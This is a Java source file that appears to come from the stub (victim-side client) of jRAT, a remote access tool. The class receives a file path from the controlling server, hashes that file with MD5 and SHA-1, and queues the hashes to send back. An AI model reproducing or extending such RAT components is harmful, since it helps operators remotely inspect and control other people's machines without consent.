package io.jrat.stub.packets.incoming;

import io.jrat.common.hash.Md5;
import io.jrat.common.hash.Sha1;
import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet46FileHash;

import java.io.File;


public class Packet64FileHash extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String path = Connection.readLine();

		File file = new File(path);
		
		Sha1 sha1 = new Sha1();
		Md5 md5 = new Md5();

		String smd5 = md5.hash(file);
		String ssha1 = sha1.hash(file);

		System.gc();

		Connection.addToSendQueue(new Packet46FileHash(smd5, ssha1));
	}

}
